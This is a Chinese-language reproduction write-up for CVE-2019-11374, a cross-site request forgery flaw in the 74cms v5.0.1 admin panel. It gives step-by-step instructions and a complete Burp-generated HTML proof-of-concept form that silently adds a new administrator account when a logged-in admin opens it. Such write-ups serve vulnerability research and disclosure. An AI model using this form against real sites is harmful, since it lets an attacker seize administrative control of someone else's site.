# CVE-2019-11374 74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞

### 一、漏洞简介

在74CMS v5.0.1后台存在一个跨站请求伪造(CSRF)漏洞，该漏洞url：/index.php?m=admin&c=admin&a=add
攻击者可以利用该漏洞诱骗管理员点击恶意页面，从而任意添加一个后台管理员账户，达到进入后台，获得一个后台管理员角色的控制权。

### 二、漏洞影响

74CMS v5.0.1

### 三、复现过程

首先是骑士cms的安装，设置管理员账户名为admin777,密码也是admin777

![](images/15897263689467.png)


安装完成后如下url进入后台


```
http://url/74cms/index.php?m=admin&c=index&a=login
```

输入管理员账号密码同为admin777进入后台

点击系统一栏，进入到【系统】->【网络管理员】->【添加管理员】中，进行添加管理员

![](images/15897263882602.png)


![](images/15897263920112.png)


![](images/15897263956114.png)


填入自定义的用户名密码邮箱，选择好所属角色，点击添加后抓包

![](images/15897264021345.png)


使用burp生成csrf POC

![](images/15897264102331.png)


POC代码:


```html
<html>
  
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://url/74cms/index.php?m=admin&c=admin&a=add" method="POST">
      <input type="hidden" name="username" value="test007" />
      <input type="hidden" name="email" value="test&#64;qq&#46;com" />
      <input type="hidden" name="password" value="test007" />
      <input type="hidden" name="repassword" value="test007" />
      <input type="hidden" name="role&#95;id" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

测试Poc前记得先在管理页面删除test007用户，以免无法确定Poc可用性

![](images/15897264330285.png)


赋值html内容到本地的Poc.html文件中测试Poc

原管理员列表:

![](images/15897264427898.png)


点击Poc.html中的Submit Request按钮

![](images/15897264500720.png)


点击后显示操作成功

![](images/15897264565869.png)


回来管理员列表刷新页面查看管理员是否成功添加:

![](images/15897264633423.png)
